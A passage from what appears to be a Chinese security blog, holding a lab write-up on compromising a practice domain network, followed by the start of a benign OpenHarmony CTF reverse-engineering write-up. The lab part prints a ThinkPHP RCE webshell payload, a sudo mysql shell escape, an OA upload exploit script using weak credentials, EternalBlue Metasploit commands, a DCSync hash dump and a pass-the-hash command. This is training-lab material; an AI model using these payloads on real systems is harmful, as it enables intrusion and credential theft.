class="hljs-title">alive</span> <span class="hljs-title">ports</span> <span class="hljs-title">len</span> <span class="hljs-title">is</span>: 2</span><br><span class="hljs-function"><span class="hljs-title">start</span> <span class="hljs-title">vulscan</span></span><br><span class="hljs-function">[*] <span class="hljs-title">WebTitle</span> <span class="hljs-title">http</span>://39.99.133.101      <span class="hljs-title">code</span>:200 <span class="hljs-title">len</span>:5578   <span class="hljs-title">title:Bootstrap</span> <span class="hljs-title">Material</span> <span class="hljs-title">Admin</span></span><br><span class="hljs-function">[+] <span class="hljs-title">PocScan</span> <span class="hljs-title">http</span>://39.99.133.101 <span class="hljs-title">poc</span>-<span class="hljs-title">yaml</span>-<span class="hljs-title">thinkphp5023</span>-<span class="hljs-title">method</span>-<span class="hljs-title">rce</span> <span class="hljs-title">poc1</span></span><br><span class="hljs-function">已完成 2/2</span><br><span class="hljs-function">[*] 扫描结束,耗时: 55.1963091<span class="hljs-title">s</span></span><br></code></pre></td></tr></table></figure><h1 id="mysql-提权"><a href="#mysql-提权" class="headerlink" title="mysql 提权"></a>mysql 提权</h1><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">_method=__construct&amp;filter[]=<span class="hljs-built_in">system</span>&amp;<span class="hljs-built_in">method</span>=<span class="hljs-built_in">get</span>&amp;server[REQUEST_METHOD]=echo &#x27;%3C%3Fphp+%40eval%<span class="hljs-number">28</span>%24_POST%<span class="hljs-number">5B1</span>%5D%<span class="hljs-number">29</span>%3B%3F%3E&#x27; &gt;shell.php<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/607aabb350b45f53.png" alt="image-20250718043440601"></p><p>蚁剑连接，发现 sudo -l 有 mysql ，用 mysql 提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> mysql -e <span class="hljs-string">&#x27;\! /bin/sh&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/eae599b9a5466ee3.png" alt="image-20250718013242819"></p><p>拿到 flag01</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">flag&#123;<span class="hljs-number">60b53231</span>-<br></code></pre></td></tr></table></figure><h1 id="内网扫描"><a href="#内网扫描" class="headerlink" title="内网扫描"></a>内网扫描</h1><p>靶机 IP 为 </p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">172.22.1.15</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/28ec61a9315a1650.png" alt="image-20250718014053058"></p><p>传 fscan 扫内网</p><p><img src="https://img.dkdun.cn/v1/2025/12/2047f20b4fee62f4.png" alt="image-20250718015050474"></p><p>可以得出以下信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">xiaorang.lab 域<br>172.22.1.2  DC01 域控<br>172.22.1.18  信呼 OA<br>172.22.1.21 存在 MS17-010 漏洞 <br></code></pre></td></tr></table></figure><h1 id="frp-流量转发"><a href="#frp-流量转发" class="headerlink" title="frp 流量转发"></a>frp 流量转发</h1><p>上传 frp 把内网中的流量转发出来，上传 frps 和 frps.ini 到 vps，frpc 和 frpc.ini 到靶机</p><p>vps 先执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./frps -c frps.ini<br></code></pre></td></tr></table></figure><p>靶机执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./frpc -c frpc.ini<br></code></pre></td></tr></table></figure><p>已经转发出来了</p><p><img src="https://img.dkdun.cn/v1/2025/12/c87734de4285881e.png" alt="image-20250718030001184"></p><p>配置 proxfixer，配置全局代理</p><p><img src="https://img.dkdun.cn/v1/2025/12/21c92b3702bf7f09.png" alt="image-20250718030348756"></p><p>也可以用 <a href="chrome-extension://padekgcemlokbadohgkifijomclgjgif/options.html#!/about">SwitchyOmega</a>，感觉这个更方便</p><h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><p>访问 172.22.1.18 是一个信呼的 OA 系统，可以弱口令 admin:admin123 登录系统，系统存在文件上传漏洞，同 exp 目录下创建 webshell 文件，然后执行 exp 自动上传加载路径</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">session</span> = requests.<span class="hljs-keyword">session</span>()<br>url_pre = <span class="hljs-string">&#x27;http://172.22.1.18/&#x27;</span><br>url1 = url_pre + <span class="hljs-string">&#x27;?a=check&amp;m=login&amp;d=&amp;ajaxbool=true&amp;rnd=533953&#x27;</span><br>url2 = url_pre + <span class="hljs-string">&#x27;/index.php?a=upfile&amp;m=upload&amp;d=public&amp;maxsize=100&amp;ajaxbool=true&amp;rnd=798913&#x27;</span><br># url3 = url_pre + <span class="hljs-string">&#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=11&#x27;</span><br>data1 = &#123;<br>    <span class="hljs-string">&#x27;rempass&#x27;</span>: <span class="hljs-string">&#x27;0&#x27;</span>,<br>    <span class="hljs-string">&#x27;jmpass&#x27;</span>: <span class="hljs-string">&#x27;false&#x27;</span>,<br>    <span class="hljs-string">&#x27;device&#x27;</span>: <span class="hljs-string">&#x27;1625884034525&#x27;</span>,<br>    <span class="hljs-string">&#x27;ltype&#x27;</span>: <span class="hljs-string">&#x27;0&#x27;</span>,<br>    <span class="hljs-string">&#x27;adminuser&#x27;</span>: <span class="hljs-string">&#x27;YWRtaW4=&#x27;</span>,<br>    <span class="hljs-string">&#x27;adminpass&#x27;</span>: <span class="hljs-string">&#x27;YWRtaW4xMjM=&#x27;</span>,<br>    <span class="hljs-string">&#x27;yanzm&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span><br>&#125;<br><br>r = <span class="hljs-keyword">session</span>.post(url1, data=data1)<br>r = <span class="hljs-keyword">session</span>.post(url2, files=&#123;<span class="hljs-string">&#x27;file&#x27;</span>: <span class="hljs-keyword">open</span>(<span class="hljs-string">&#x27;1.php&#x27;</span>, <span class="hljs-string">&#x27;r+&#x27;</span>)&#125;)<br><br>filepath = str(r.json()[<span class="hljs-string">&#x27;filepath&#x27;</span>])<br>filepath = &quot;/&quot; + filepath.split(<span class="hljs-string">&#x27;.uptemp&#x27;</span>)[<span class="hljs-number">0</span>] + <span class="hljs-string">&#x27;.php&#x27;</span><br>id = r.json()[<span class="hljs-string">&#x27;id&#x27;</span>]<br>url3 = url_pre + f<span class="hljs-string">&#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=&#123;id&#125;&#x27;</span><br>r = <span class="hljs-keyword">session</span>.<span class="hljs-keyword">get</span>(url3)<br>r = <span class="hljs-keyword">session</span>.<span class="hljs-keyword">get</span>(url_pre + filepath + &quot;?1=system(&#x27;dir&quot;)<br>print(r.text)<br>print(filepath)<br></code></pre></td></tr></table></figure><p>加载出路径</p><p><img src="https://img.dkdun.cn/v1/2025/12/ca2d3a4648abee02.png" alt="image-20250718205453954"></p><p>蚁剑连接，在 Administrator  用户的目录下拿到 flag2</p><p><img src="https://img.dkdun.cn/v1/2025/12/8d1399da7d60e1a8.png" alt="image-20250718194206150"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag02</span>: <span class="hljs-number">2</span>ce3-<span class="hljs-number">4813</span>-<span class="hljs-number">87</span>d4-<br></code></pre></td></tr></table></figure><h1 id="MS17-010"><a href="#MS17-010" class="headerlink" title="MS17-010"></a>MS17-010</h1><p>对 172.22.1.21 进行永恒之蓝攻击</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">proxychains msfconsole<br>search ms17-010<br>use exploit/windows/smb/ms17_010_eternalblue<br><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/bind_tcp<br><span class="hljs-built_in">set</span> rhosts 172.22.1.21<br>run<br></code></pre></td></tr></table></figure><p>拿到 shell，之后调用 mimikatz 的 kiwi 模块横向</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">load kiwi<br>kiwi_cmd lsadump::dcsync /domain:xiaorang.lab /all /csv<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/f7548133109a3a9b.png" alt="image-20250718203336451"></p><p>进行 DCSync 攻击，拿到域控 hash</p><p>拿 Administrator 用户的 hash，然后使用  crackmapexec 进行哈希传递攻击，实现 DC 域控上的任意命令执行获取 flag3</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">proxychains crackmapexec smb <span class="hljs-number">172.22</span>.<span class="hljs-number">1.2</span> -u administrator -H<span class="hljs-number">10</span>cf<span class="hljs-number">89</span>a<span class="hljs-number">850</span>fb<span class="hljs-number">1</span>cdbe<span class="hljs-number">6</span>bb<span class="hljs-number">432</span>b<span class="hljs-number">859164</span><span class="hljs-keyword">c</span><span class="hljs-number">8</span> -d xiaorang.lab -<span class="hljs-keyword">x</span> <span class="hljs-string">&quot;type Users\Administrator\flag\flag03.txt&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/4b49f1d865d0d44e.png" alt="image-20250718203112160"></p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">flag03:</span> e8f88d0d43d6&#125;<br></code></pre></td></tr></table></figure><p>完整 flag </p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">flag&#123;<span class="hljs-number">60b53231</span>-2ce3-<span class="hljs-number">4813</span>-87d4-e8f88d0d43d6&#125;<br></code></pre></td></tr></table></figure><h1 id="DCSync"><a href="#DCSync" class="headerlink" title="DCSync"></a>DCSync</h1><p>参考 <a href="https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-DCSync">域渗透-DCSync</a></p><p>DCSync 是利用 <a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/f977faaa-673e-4f66-b9bf-48c640241d47">DRS(Directory Replication Service)</a> 协议通过 IDL_DRSGetNCChanges 从域控制器复制用户凭据，所以可以通过 DCSync 来导出所有用户的 hash 然后进行哈希传递攻击</p><p><strong>利用条件：</strong></p><p>获得以下任一用户的权限：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs arcade">Administrators组内的用户<br><span class="hljs-built_in">Domain</span> Admins组内的用户<br>Enterprise Admins组内的用户<br>域控制器的计算机<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>渗透</category>
      
      <category>靶机</category>
      
      <category>春秋云镜</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网渗透 DCSync MS17-010</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>第一届OpenHarmony CTF专题赛</title>
    <link href="/2025/07/17/%E7%AC%AC%E4%B8%80%E5%B1%8AOpenHarmony-CTF%E4%B8%93%E9%A2%98%E8%B5%9B/"/>
    <url>/2025/07/17/%E7%AC%AC%E4%B8%80%E5%B1%8AOpenHarmony-CTF%E4%B8%93%E9%A2%98%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h1 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h1><h2 id="easyre"><a href="#easyre" class="headerlink" title="easyre"></a>easyre</h2><p>将 hap 文件解压，把 ets 目录下的 modules.abc 字节码文件丢入 abc-decompiler 反编译</p><p><img src="https://img.dkdun.cn/v1/2025/12/2a9e4d9bd327c449.png" alt="image-20250714163817762"></p><p>在 pages&#x2F;Index 拿到密文 hint1，往下翻看到加密逻辑</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object #~@<span class="hljs-number">1</span>&gt;@<span class="hljs-number">2</span>*^<span class="hljs-number">2</span>*#(Object functionObject, Object newTarget, Index <span class="hljs-built_in">this</span>) &#123;<br>    i = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">for</span> (i2 = <span class="hljs-number">0</span>; (i2 &lt; _lexenv_0_1_.hint1.length ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>) != <span class="hljs-number">0</span>; i2 = tonumer(i2) + <span class="hljs-number">1</span>) &#123;<br>        obj = String.fromCharCode;<br>        obj2 = _lexenv_0_1_.hint1;<br>        i += obj(obj2.charCodeAt(i2) + _lexenv_0_1_.hint1.length);<br>    &#125;<br>    ldlexvar = _lexenv_0_1_;<br>    reverseStr = ldlexvar.reverseStr(i);<br>    i3 = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">for</span> (i4 = <span class="hljs-number">0</span>; (i4 &lt; _lexenv_0_1_.hint1.length ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>) != <span class="hljs-number">0</span>; i4 = tonumer(i4) + <span class="hljs-number">1</span>) &#123;<br>        i3 += String.fromCharCode(reverseStr.charCodeAt(i4) - i4);<br>    &#125;<br>    ldlexvar2 = _lexenv_0_1_;<br>    reverseStr2 = ldlexvar2.reverseStr(i3);<br>    obj3 = createobjectwithbuffer([<span class="hljs-string">&quot;hint1&quot;</span>, <span class="hljs-number">0</span>]);<br>    obj3.hint1 = reverseStr2;<br>    router = <span class="hljs-keyword">import</span> &#123; <span class="hljs-keyword">default</span> as router &#125; from <span class="hljs-string">&quot;@ohos:router&quot;</span>;<br>    obj4 = router.pushUrl;<br>    obj5 = createobjectwithbuffer([<span class="hljs-string">&quot;url&quot;</span>, <span class="hljs-string">&quot;pages/Flag&quot;</span>, <span class="hljs-string">&quot;params&quot;</span>, <span class="hljs-number">0</span>]);<br>    obj5.params = obj3;<br>    callthisN = obj4(obj5);<br>    then = callthisN.then();<br>    then.<span class="hljs-keyword">catch</span>(#~@<span class="hljs-number">1</span>&gt;@<span class="hljs-number">2</span>*^<span class="hljs-number">2</span>**#);<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>&#125;<br><br><br><span class="hljs-keyword">public</span> Object #~@<span class="hljs-number">1</span>&gt;#reverseStr(Object functionObject, Object newTarget, Index <span class="hljs-built_in">this</span>, Object arg0) &#123;<br>    obj = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">for</span> (i = arg0.length - <span class="hljs-number">1</span>; (i &gt;= <span class="hljs-number">0</span> ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>) != <span class="hljs-number">0</span>; i = tonumer(i) - <span class="hljs-number">1</span>) &#123;<br>        obj = (obj == <span class="hljs-literal">true</span> ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>) + arg0[i];<br>    &#125;<br>    <span class="hljs-keyword">return</span> obj;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>先将 hint1 Reverse，然后加 Length 再减 Index，最后再 Reverse，最终结果 <code>finalHint</code> 被赋值给 <code>obj3.hint1</code>，作为参数传给 <code>pages/Flag</code></p><p>在 Flag 中发现 magic 的值，第二段 flag </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object #~@<span class="hljs-number">0</span>=#Flag(Object functionObject, Object newTarget, Flag <span class="hljs-built_in">this</span>, Object arg0, Object arg1, Object arg2, Object arg3, Object arg4, Object arg5) &#123;<br>    obj = arg3;<br>    obj2 = arg4;<br>    <span class="hljs-keyword">if</span> ((<span class="hljs-number">0</span> == obj ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>) != <span class="hljs-number">0</span>) &#123;<br>        obj = -<span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> ((<span class="hljs-number">0</span> == obj2 ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>) != <span class="hljs-number">0</span>) &#123;<br>        obj2 = <span class="hljs-literal">null</span>;<br>    &#125;<br>    obj3 = <span class="hljs-built_in">super</span>(arg0, arg2, obj, arg5);<br>    <span class="hljs-keyword">if</span> ((<span class="hljs-string">&quot;function&quot;</span> == typeof(obj2) ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>) != <span class="hljs-number">0</span>) &#123;<br>        obj3.paramsGenerator_ = obj2;<br>    &#125;<br>    obj3.__message = ObservedPropertySimplePU(<span class="hljs-string">&quot;Click 1000000 times to get the flag&quot;</span>, obj3, <span class="hljs-string">&quot;message&quot;</span>);<br>    obj3.count = <span class="hljs-number">0</span>;<br>    obj3.magic = <span class="hljs-string">&quot;ODg0ZjMxNWYxMDJiMGI4ZGI1NjgwNWYzNGJkYzgxY2ZlYzI&quot;</span>;<br>    obj3.setInitiallyProvidedValue(arg1);<br>    obj3.finalizeConstruction();<br>    <span class="hljs-keyword">return</span> obj3;<br>&#125;<br><br><span class="hljs-keyword">public</span> Object #~@<span class="hljs-number">0</span>&gt;#getH2(Object functionObject, Object newTarget, Flag <span class="hljs-built_in">this</span>, Object arg0) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">import</span> &#123; decodeToString &#125; from <span class="hljs-string">&quot;@normalized:N&amp;&amp;&amp;entry/src/main/ets/utils/Coder&amp;&quot;</span>(arg0);<br>&#125;<span class="hljs-comment">// base解密</span><br><br><br><br><span class="hljs-keyword">public</span> Object #~@<span class="hljs-number">0</span>&gt;@<span class="hljs-number">1</span>*^<span class="hljs-number">2</span>*#(Object functionObject, Object newTarget, Flag <span class="hljs-built_in">this</span>) &#123;<br>    ldlexvar = _lexenv_0_1_;<br>    ldlexvar.count = tonumer(ldlexvar.count) + <span class="hljs-number">1</span>;<br>    router = <span class="hljs-keyword">import</span> &#123; <span class="hljs-keyword">default</span> as router &#125; from <span class="hljs-string">&quot;@ohos:router&quot;</span>;<br>    r14 = router.getParams().hint1;<br>    <span class="hljs-keyword">if</span> ((<span class="hljs-number">1000000</span> == _lexenv_0_1_.count ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>) == <span class="hljs-number">0</span>) &#123;<br>        promptAction = <span class="hljs-keyword">import</span> &#123; <span class="hljs-keyword">default</span> as promptAction &#125; from <span class="hljs-string">&quot;@ohos:promptAction&quot;</span>;<br>        obj = promptAction.showToast;<br>        obj2 = createobjectwithbuffer([<span class="hljs-string">&quot;message&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-string">&quot;duration&quot;</span>, <span class="hljs-number">2000</span>]);<br>        obj2.message = _lexenv_0_1_.count + <span class="hljs-string">&quot;&quot;</span>;<br>        obj(obj2);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>    ldlexvar2 = _lexenv_0_1_;<br>    getH2 = r14 + ldlexvar2.getH2(_lexenv_0_1_.magic);<br>    promptAction2 = <span class="hljs-keyword">import</span> &#123; <span class="hljs-keyword">default</span> as promptAction &#125; from <span class="hljs-string">&quot;@ohos:promptAction&quot;</span>;<br>    obj3 = promptAction2.showToast;<br>    obj4 = createobjectwithbuffer([<span class="hljs-string">&quot;message&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-string">&quot;duration&quot;</span>, <span class="hljs-number">2000</span>]);<br>    obj4.message = <span class="hljs-string">&quot;The flag is flag&#123;&quot;</span> + getH2 + <span class="hljs-string">&quot;&#125;&quot;</span>;<br>    obj3(obj4);<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>最后 flag &#x3D; r14 ＋ reverse(decode_magic) ，所以可以得出逆向脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode_hint1</span>(<span class="hljs-params">cipher: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">str</span>:<br>    length = <span class="hljs-built_in">len</span>(cipher)<br>    <span class="hljs-comment"># charCode + length，Revese</span><br>    step1 = <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(c) + length) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> cipher])<br>    reverse1 = step1[::-<span class="hljs-number">1</span>]<br>    <span class="hljs-comment"># charCode - index</span><br>    step3 = <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(reverse1[i]) - i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(reverse1))])<br>    <span class="hljs-comment"># Reverse</span><br>    decrypted = step3[::-<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">return</span> decrypted<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode_magic</span>(<span class="hljs-params">magic</span>):<br>    padding = <span class="hljs-number">4</span> - <span class="hljs-built_in">len</span>(magic) % <span class="hljs-number">4</span><br>    <span class="hljs-keyword">if</span> padding != <span class="hljs-number">4</span>:<br>        magic += <span class="hljs-string">&#x27;=&#x27;</span> * padding<br>    decrypted = base64.b64decode(magic).decode()<br>    <span class="hljs-comment"># Reverse</span><br>    decrypted = decrypted[::-<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">return</span> decrypted<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_flag</span>():<br>    hint1 = <span class="hljs-string">&quot;opfj^_mgekc]iWccXbf&quot;</span><br>    magic = <span class="hljs-string">&quot;ODg0ZjMxNWYxMDJiMGI4ZGI1NjgwNWYzNGJkYzgxY2ZlYzI&quot;</span><br><br>    decrypt_hint1 = decode_hint1(hint1)<br>    decrypt_magic = decode_magic(magic)<br><br>    flag = <span class="hljs-string">f&quot;flag&#123;&#123;<span class="hljs-subst">&#123;decrypt_hint1&#125;</span><span class="hljs-subst">&#123;decrypt_magic&#125;</span>&#125;&#125;&quot;</span><br>    <span class="hljs-keyword">return</span> flag<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-built_in">print</span>(get_flag())<br></code></pre></td></tr></table></figure><p>拿到 flag：</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">flag&#123;princetonuniversity2cefc18cdb43f50865bd8b0b201f<span class="hljs-number">513f488</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="arkts"><a href="#arkts" class="headerlink" title="arkts"></a>arkts</h2><p>分析源码大概可以知道 enc 先 rc4  再 rsa 然后 base64 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object #~@<span class="hljs-number">0</span>&gt;#enc(Object functionObject, Object newTarget, Index <span class="hljs-built_in">this</span>, Object arg0) &#123;<br>    rsaEncrypt = <span class="hljs-built_in">this</span>.rsaEncrypt(<span class="hljs-built_in">this</span>.rc4Encrypt(<span class="hljs-built_in">this</span>.secretKey, arg0));<br>    objArr = [Object];<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; (i &lt; rsaEncrypt.length ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>) != <span class="hljs-number">0</span>; i = tonumer(i) + <span class="hljs-number">1</span>) &#123;<br>        obj = <span class="hljs-built_in">this</span>.customBase64;<br>        obj2 = <span class="hljs-built_in">this</span>.stringToUint8Array;<br>        ldobjbyvalue = rsaEncrypt[i];<br>        objArr[i] = obj(obj2(ldobjbyvalue.toString()));<br>    &#125;<br>    <span class="hljs-keyword">return</span> objArr;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>可以从中提取到密文</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object #~@<span class="hljs-number">0</span>=#Index(Object functionObject, Object newTarget, Index <span class="hljs-built_in">this</span>, Object arg0, Object arg1, Object arg2, Object arg3, Object arg4, Object arg5) &#123;<br>    obj = arg3;<br>    obj2 = arg4;<br>    <span class="hljs-keyword">if</span> ((<span class="hljs-number">0</span> == obj ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>) != <span class="hljs-number">0</span>) &#123;<br>        obj = -<span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> ((<span class="hljs-number">0</span> == obj2 ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>) != <span class="hljs-number">0</span>) &#123;<br>        obj2 = <span class="hljs-literal">null</span>;<br>    &#125;<br>    obj3 = <span class="hljs-built_in">super</span>(arg0, arg2, obj, arg5);<br>    <span class="hljs-keyword">if</span> ((<span 